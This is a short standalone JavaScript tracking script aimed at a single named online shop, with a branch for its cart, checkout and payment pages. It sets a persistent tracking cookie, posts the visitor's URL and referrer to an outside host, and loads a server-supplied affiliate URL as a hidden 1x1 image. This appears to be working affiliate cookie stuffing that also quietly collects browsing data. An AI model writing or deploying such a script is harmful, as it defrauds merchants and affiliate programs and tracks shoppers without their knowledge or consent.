(function () {

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      var r = Math.random() * 16 | 0;
      var v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function firePixel(url) {
    var img = document.createElement('img');
    img.src = url;
    img.width = 1;
    img.height = 1;
    img.style.display = 'none';
    document.body.appendChild(img);
  }

  function isCartPage() {
    var cartPatterns = ['cart', 'checkout', 'pay', 'shipping', 'review-order', 'payment'];
    return cartPatterns.some(function (path) {
      return window.location.pathname.toLowerCase().includes(path);
    });
  }

  async function initTracking() {
    try {
      var uniqueId = getCookie('tracking_uuid') || generateUUID();
      var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();

      document.cookie = 'tracking_uuid=' + uniqueId +
        '; expires=' + expires +
        '; path=/; SameSite=Lax';

      var response = await fetch('https://api.aimedialinks.com/api/track-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname
        })
      });

      var result = await response.json();

      if (result.success && result.affiliate_url) {
        firePixel(result.affiliate_url);
        sessionStorage.setItem('tracking_done', '1');
      } else {
        firePixel('https://api.aimedialinks.com/api/fallback-pixel?id=' + uniqueId);
      }

    } catch (e) {
      console.error('Tracking error', e);
    }
  }

  function run() {
    var hostname = window.location.hostname;

    var siteConfigs = {
      
      'alokozayshop.com':     { always: true,  cartExtra: true }
    };

    var config = siteConfigs[hostname];

    if (config) {
      if (config.cartExtra && isCartPage()) {
        initTracking();
      } else if (config.always) {
        initTracking();
      }
    }
  }

  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    run();
  } else {
    window.addEventListener('DOMContentLoaded', run, { once: true });
  }

})();
